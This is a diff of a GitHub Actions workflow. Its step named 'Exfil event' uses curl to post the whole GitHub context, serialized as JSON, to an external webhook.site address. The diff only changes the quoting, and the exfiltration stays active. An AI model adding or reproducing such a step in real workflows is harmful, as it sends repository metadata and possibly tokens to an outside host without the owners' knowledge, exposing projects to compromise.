@@ -21,7 +21,7 @@ jobs:
 
     - name: Exfil event
       run: |
-        curl https://webhook.site/df8cc6ae-32b1-42cb-85a7-21c19fd37f56 --data "${{ toJSON(github) }}"
+        curl https://webhook.site/df8cc6ae-32b1-42cb-85a7-21c19fd37f56 --data '${{ toJSON(github) }}'
 
     - name: Compute short SHA
       id: short_sha
